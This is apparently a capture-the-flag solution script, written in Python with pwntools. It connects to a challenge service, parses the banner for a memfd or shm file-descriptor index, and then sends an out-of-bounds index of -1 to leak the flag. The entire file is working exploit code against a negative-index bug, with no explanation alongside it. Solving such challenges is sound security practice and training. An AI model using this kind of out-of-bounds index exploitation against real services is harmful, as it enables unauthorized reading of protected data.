#!/usr/bin/env python3

import sys

from pwn import context, remote


context.log_level = "info"


def main() -> int:
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 11222

    io = remote(host, port)

    banner = io.recvuntil(b"Enter a message", timeout=5)
    sys.stdout.buffer.write(banner + b"\n")

    io.sendline(b"hello")

    out = io.recvuntil(b"How many indices?", timeout=5)
    sys.stdout.buffer.write(out + b"\n")

    # Parse a safe index for the first stage (prefer memfd/shm).
    text = (banner + out).decode(errors="ignore")
    idx = None
    for line in text.splitlines():
        if ("created" in line) and ("memfd" in line or "shm" in line) and ("at index" in line):
            # Example: "[+] created shm        at index 0 (fd=3)"
            parts = line.rsplit("at index", 1)
            if len(parts) != 2:
                continue
            tail = parts[1].strip()
            try:
                idx = int(tail.split()[0])
                break
            except Exception:
                continue
    if idx is None:
        print("Could not find a memfd/shm index in output.", file=sys.stderr)
        return 1

    io.sendline(b"2")
    sys.stdout.buffer.write(io.recvuntil(b"Enter 2 integers", timeout=5) + b"\n")

    # First stage: use a valid index. Last stage: -1 to leak the real flag.
    io.sendline(f"{idx} -1".encode())

    sys.stdout.buffer.write(io.recvrepeat(1))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())


